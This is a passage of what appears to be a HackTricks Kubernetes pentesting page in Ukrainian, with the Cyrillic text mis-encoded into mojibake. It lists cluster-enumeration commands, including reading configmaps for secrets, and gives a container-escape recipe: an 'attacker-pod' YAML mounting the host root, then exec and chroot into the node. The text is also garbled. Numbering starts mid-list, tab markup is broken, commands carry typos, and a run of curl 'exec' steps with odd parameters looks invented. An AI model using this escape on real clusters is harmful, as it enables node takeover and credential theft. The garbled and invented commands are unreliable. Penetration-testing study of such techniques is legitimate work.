22. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `kube-proxy`:
    ```bash
    cat /etc/kubernetes/manifests/kube-proxy.yaml
    ```

23. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `coredns`:
    ```bash
    cat /etc/kubernetes/manifests/coredns.yaml
    ```

24. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `kube-flannel`:
    ```bash
    cat /etc/kubernetes/manifests/kube-flannel.yaml
    ```

25. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `calico`:
    ```bash
    cat /etc/kubernetes/manifests/calico.yaml
    ```

26. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `weave-net`:
    ```bash
    cat /etc/kubernetes/manifests/weave-net.yaml
    ```
{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### –û—Ç—Ä–∏–º–∞—Ç–∏ DaemonSets

**DaeamonSets** –¥–æ–∑–≤–æ–ª—è—î –∑–∞–±–µ–∑–ø–µ—á–∏—Ç–∏ —Ç–µ, —â–æ **–∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π –ø—ñ–¥–ø—Ä–æ—Ü–µ—Å –ø—Ä–∞—Ü—é—î –Ω–∞ –≤—Å—ñ—Ö –≤—É–∑–ª–∞—Ö** –∫–ª–∞—Å—Ç–µ—Ä–∞ (–∞–±–æ –Ω–∞ –≤–∏–±—Ä–∞–Ω–∏—Ö). –Ø–∫—â–æ –≤–∏ –≤–∏–¥–∞–ª–∏—Ç–µ DaemonSet, –∫–µ—Ä–æ–≤–∞–Ω—ñ –Ω–∏–º –ø—ñ–¥–ø—Ä–æ—Ü–µ—Å–∏ —Ç–∞–∫–æ–∂ –±—É–¥—É—Ç—å –≤–∏–¥–∞–ª–µ–Ω—ñ.
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %} {% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
### –û—Ç—Ä–∏–º–∞—Ç–∏ cronjob

Cron-–∑–∞–≤–¥–∞–Ω–Ω—è –¥–æ–∑–≤–æ–ª—è—î –ø–ª–∞–Ω—É–≤–∞—Ç–∏ –∑–∞–ø—É—Å–∫ –∫–∞–ø—Å—É–ª–∏, —è–∫–∞ –≤–∏–∫–æ–Ω–∞—î –ø–µ–≤–Ω—É –¥—ñ—é.

{% tabs %}
{% tab title="kubectl" %}
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}### –ü–æ—à—É–∫ API-—Å–µ—Ä–≤–µ—Ä–∞

1. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –¥–æ—Å—Ç—É–ø–Ω–∏–π API-—Å–µ—Ä–≤–µ—Ä Kubernetes –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `kubectl`:

```bash
kubectl get pods --all-namespaces
kubectl get pods --all-namespaces -o wide
kubectl get svc --all-namespaces
kubectl get svc --all-namespaces -o wide
kubectl get deployments --all-namespaces
kubectl get deployments --all-namespaces -o wide
```

2. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –¥–æ—Å—Ç—É–ø–Ω–∏–π API-—Å–µ—Ä–≤–µ—Ä Kubernetes –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `curl`:

```bash
curl -k https://<CLUSTER-IP>:<PORT>
curl -k https://<CLUSTER-IP>:<PORT>/version
curl -k https://<CLUSTER-IP>:<PORT>/apis
curl -k https://<CLUSTER-IP>:<PORT>/api/v1
curl -k https://<CLUSTER-IP>:<PORT>/api/v1/namespaces
```

3. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubetcl` –¥–ª—è –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ API-—Å–µ—Ä–≤–µ—Ä–æ–º:

```bash
kubectl proxy --port 8000
curl http://localhost:8000
curl http://localhost:8000/version
curl http://localhost:8000/apis
curl http://localhost:8000/api/v1
curl http://localhost:8000/api/v1/namespaces
```

4. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubetcl` –¥–ª—è –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ API-—Å–µ—Ä–≤–µ—Ä–æ–º —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å—ñ:

```bash
kubectl proxy --port 8000
curl http://localhost:8000/api/v1/namespaces
```

5. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubetcl` –¥–ª—è –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ API-—Å–µ—Ä–≤–µ—Ä–æ–º —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å—ñ —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É –¥–æ —Ä–µ—Å—É—Ä—Å—ñ–≤:

```bash
kubectl proxy --port 8000
curl http://localhost:8000/api/v1/namespaces/default/pods
curl http://localhost:8000/api/v1/namespaces/default/pods/<POD-NAME>
```

6. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubetcl` –¥–ª—è –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ API-—Å–µ—Ä–≤–µ—Ä–æ–º —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å—ñ —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–∞–ø–∏—Ç—ñ–≤:

```bash
kubectl proxy --port 8000
curl -X POST http://localhost:8000/api/v1/namespaces/default/pods/<POD-NAME>/exec?command=ls&command=-l
```

7. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubetcl` –¥–ª—è –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ API-—Å–µ—Ä–≤–µ—Ä–æ–º —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å—ñ —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥ —É –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ:

```bash
kubectl proxy --port 8000
curl -X POST http://localhost:8000/api/v1/namespaces/default/pods/<POD-NAME>/exec?command=ls&command=-l&container=<CONTAINER-NAME>
```

8. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubetcl` –¥–ª—è –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ API-—Å–µ—Ä–≤–µ—Ä–æ–º —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å—ñ —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥ —É –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ –∑ –≤–∏–≤–µ–¥–µ–Ω–Ω—è–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ–≤:

```bash
kubectl proxy --port 8000
curl -X POST http://localhost:8000/api/v1/namespaces/default/pods/<POD-NAME>/exec?command=ls&command=-l&container=<CONTAINER-NAME>&output=watch
```

9. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubetcl` –¥–ª—è –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ API-—Å–µ—Ä–≤–µ—Ä–æ–º —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å—ñ —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥ —É –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ –∑ –≤–∏–≤–µ–¥–µ–Ω–Ω—è–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ–≤ —É —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ:

```bash
kubectl proxy --port 8000
curl -X POST http://localhost:8000/api/v1/namespaces/default/pods/<POD-NAME>/exec?command=ls&command=-l&container=<CONTAINER-NAME>&output=watch&stderr=true&stdin=true&stdout=true
```

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
### –û—Ç—Ä–∏–º–∞—Ç–∏ configMap

configMap –∑–∞–≤–∂–¥–∏ –º—ñ—Å—Ç–∏—Ç—å –±–∞–≥–∞—Ç–æ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó —Ç–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–π —Ñ–∞–π–ª, —è–∫–∏–π –Ω–∞–¥–∞—î –¥–æ–¥–∞—Ç–∫–∞–º, —è–∫—ñ –ø—Ä–∞—Ü—é—é—Ç—å –≤ Kubernetes. –ó–∞–∑–≤–∏—á–∞–π –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –±–∞–≥–∞—Ç–æ –ø–∞—Ä–æ–ª—ñ–≤, —Å–µ–∫—Ä–µ—Ç—ñ–≤, —Ç–æ–∫–µ–Ω—ñ–≤, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –¥–æ —ñ–Ω—à–∏—Ö –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö/–∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö —Å–ª—É–∂–±.

{% tabs %}

{% tab title="kubectl" %}
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### –û—Ç—Ä–∏–º–∞—Ç–∏ "–≤—Å–µ"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **–û—Ç—Ä–∏–º–∞–Ω–Ω—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ä–µ—Å—É—Ä—Å—ñ–≤ Pods**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
### –í—Ç–µ—á–∞ –∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –Ω–æ–≤—ñ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏, –≤–∏, –º–æ–∂–ª–∏–≤–æ, –∑–º–æ–∂–µ—Ç–µ –≤—Ç–µ–∫—Ç–∏ –∑ –Ω–∏—Ö –Ω–∞ –≤—É–∑–æ–ª. –î–ª—è —Ü—å–æ–≥–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ñ–∞–π–ª yaml, –ø–µ—Ä–µ–∫–ª—é—á–∏—Ç–∏—Å—è –Ω–∞ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä, –∞ –ø–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ chroot –¥–ª—è –≤—Ö–æ–¥—É –≤ —Å–∏—Å—Ç–µ–º—É –≤—É–∑–ª–∞. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤–∂–µ —ñ—Å–Ω—É—é—á—ñ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏ —è–∫ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –¥–ª—è —Ñ–∞–π–ª—É yaml, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∏ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—Ç—å —ñ—Å–Ω—É—é—á—ñ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è —Ç–∞ —à–ª—è—Ö–∏.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> —è–∫—â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ pod –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É –≤—É–∑–ª—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –º—ñ—Ç–∫–∏ –Ω–∞ –≤—É–∑–ª—ñ
>
> `k get nodes --show-labels`
>
> –ó–∞–∑–≤–∏—á–∞–π, kubernetes.io/hostname —Ç–∞ node-role.kubernetes.io/master - —Ü–µ –≤—Å—ñ –≥–∞—Ä–Ω—ñ –º—ñ—Ç–∫–∏ –¥–ª—è –≤–∏–±–æ—Ä—É.
>
> [–ø–æ—Å–∏–ª–∞–Ω–Ω—è]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

–ü–æ—Ç—ñ–º –≤–∏ —Å—Ç–≤–æ—Ä—é—î—Ç–µ —Å–≤—ñ–π —Ñ–∞–π–ª attack.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[–æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π yaml-–∫–æ–¥](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

–ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –≤–∏ —Å—Ç–≤–æ—Ä—é—î—Ç–µ pod
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
–¢–µ–ø–µ—Ä –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–∫–ª—é—á–∏—Ç–∏—Å—è –¥–æ —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –ø–æ–¥—É –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
–Ü, –Ω–∞—Ä–µ—à—Ç—ñ, –≤–∏ –≤–∏–∫–æ–Ω—É—î—Ç–µ chroot –≤ —Å–∏—Å—Ç–µ–º—É –≤—É–∑–ª–∞
```bash
chroot /root /bin/bash
```
–Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –æ—Ç—Ä–∏–º–∞–Ω–∞ –∑: [Kubernetes Namespace Breakout using Insecure Host Path Volume ‚Äî Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube ‚Äì Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF** –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
